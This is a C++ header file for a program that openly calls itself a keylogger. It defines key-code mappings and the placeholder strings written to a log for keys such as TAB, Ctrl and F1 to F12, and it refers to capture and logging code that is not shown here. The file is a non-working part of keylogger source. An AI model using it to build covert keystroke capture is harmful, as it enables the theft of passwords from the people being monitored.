/*
    ``~ Header file for constants used within the keylogger program (Written by haeoro) ~``

        - Section 1
            Group of constants created to map a characters extended ascii value to it's true ascii value for conversion.
            (see mappings.cpp:ln:26)
        - Section 2
            Group of constants created to represent a key value returned by GetKeyState() if a key is being pressed. 
            ENTER's ascii value is 13. 
        - Section 3
            Group of constant string literals created to be specifically written to a file in the event that a key, I.E. TAB key 
            does not have a corresponding ascii value that can be converted and written to our standard writeKeyStroke function
            in main.cpp:ln:12 
*/

#pragma once 
#include <string>

// Section 1. 
const int COMMA = 188;
const int EQUAL = 187;
const int PERIOD = 190;
const int SEMICOLON = 186;
const int OBRACKETL = 219;
const int OBRACKETR = 221;
const int APOSTROPHE = 222; 
const int VERGULE = 191;
const int BACKSLASH = 220;
const int HYPHEN = 189;
const int ACUTE = 192;

// Section 2
const int KEY_IS_PRESSED = -32767;
const int KEY_IS_PRESSED2 = -32768;
const int ENTER = 13;

// Section 3
const std::string BACKSPACE = "{kp='BACKSPACE'}";
const std::string TAB = "{kp='TAB'}";
const std::string CTRL_L = "{kp='Left Ctrl'}";
const std::string CTRL_R = "{kp='Right Ctrl'}";
const std::string ALT_L = "{kp='Left ALT'}";
const std::string ALT_R = "{kp='Right ALT'}";
const std::string WINKEY = "{kp='WINKEY'}";
const std::string PGUP = "{kp='PGUP'}";
const std::string INSERT = "{kp='INSERT'}";
const std::string DEL = "{kp='DEL'}";
const std::string HOME = "{kp='HOME'}";
const std::string END = "{kp='END'}";
const std::string PGDOWN = "{kp='PGDOWN'}";

const std::string F1 = "{kp='F1'}";
const std::string F2 = "{kp='F2'}";
const std::string F3 = "{kp='F3'}";
const std::string F4 = "{kp='F4'}";
const std::string F5 = "{kp='F5'}";
const std::string F6 = "{kp='F6'}";
const std::string F7 = "{kp='F7'}";
const std::string F8 = "{kp='F8'}";
const std::string F9 = "{kp='F9'}";
const std::string F10 = "{kp='F10'}";
const std::string F11 = "{kp='F11'}";
const std::string F12 = "{kp='F12'}";